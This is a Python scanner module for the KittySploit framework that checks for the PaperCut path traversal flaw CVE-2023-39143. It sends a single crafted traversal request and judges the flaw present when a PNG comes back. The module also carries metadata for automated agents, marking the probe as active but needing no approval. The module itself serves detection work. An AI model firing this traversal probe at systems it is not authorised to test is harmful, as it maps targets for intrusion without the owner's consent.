#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""PaperCut NG and PaperCut MF before 22."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'PaperCut < 22.1.3 - Path Traversal Detection',
        'description': 'PaperCut NG and PaperCut MF before 22.1.3 are vulnerable to path traversal which enables attackers to read, delete, and upload arbitrary files.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'lfi', 'papercut', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2023-39143',
            'https://www.horizon3.ai/cve-2023-39143-papercut-path-traversal-file-upload-rce-vulnerability/',
            'https://www.papercut.com/kb/Main/securitybulletinjuly2023/',
            'https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-131a',
            'https://github.com/nomi-sec/PoC-in-GitHub',
        ],
        'cve': 'CVE-2023-39143',
    }

    def run(self):
        path = '/custom-report-example/..\\..\\..\\deployment\\sharp\\icons\\home-app.png'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = (r.text or "").lower()
        content_type = (r.headers.get("Content-Type") or r.headers.get("content-type") or "").lower()
        body_any = ('89504e470d0a1a0a',)
        ctype_any = ('image/png',)
        if (any(m in body for m in body_any)) and (any(m in content_type for m in ctype_any)):
            self.set_info(
                severity='critical',
                reason='PaperCut < 22.1.3 - Path Traversal detected',
                path=path,
            )
            return True
        return False

